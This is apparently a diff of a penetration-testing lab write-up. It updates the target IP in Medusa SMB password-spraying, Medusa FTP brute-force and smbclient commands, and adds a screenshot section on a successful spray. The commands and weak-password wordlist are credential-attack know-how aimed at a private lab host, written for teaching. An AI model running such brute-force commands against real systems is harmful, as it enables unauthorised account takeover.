@@ -82,7 +82,7 @@ echo -e "password\n123456\nmsfadmin\nwelcome123" > passwords.txt
 ## 3. SMB Password Spraying (Medusa)
 
 ```bash
-medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M smbnt -t 2 -T 50
+medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt -t 2 -T 50
 ```
 
 ### Parameters:
@@ -98,7 +98,7 @@ medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M smbnt -t 2 -T 50
 ## 4. Access Validation (SMB)
 
 ```bash
-smbclient -L //192.168.56.102 -U msfadmin
+smbclient -L //192.168.56.101 -U msfadmin
 ```
 
 Used to validate if credentials allow access and list available shares.
@@ -108,7 +108,7 @@ Used to validate if credentials allow access and list available shares.
 ## 5. FTP Brute Force (Optional)
 
 ```bash
-medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp
+medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp
 ```
 
 ---
@@ -156,6 +156,13 @@ This demonstrates:
 Custom wordlists were created to simulate credential attacks:
 
 ![Wordlist Creation](image/wordlist_creation.png)
+
+## SMB Password Spraying (Medusa)
+
+ This demonstrates how attackers can exploit weak passwords after user enumeration:
+
+ ![medusa success](image/medusa_success.png)
+
 
 
 ---
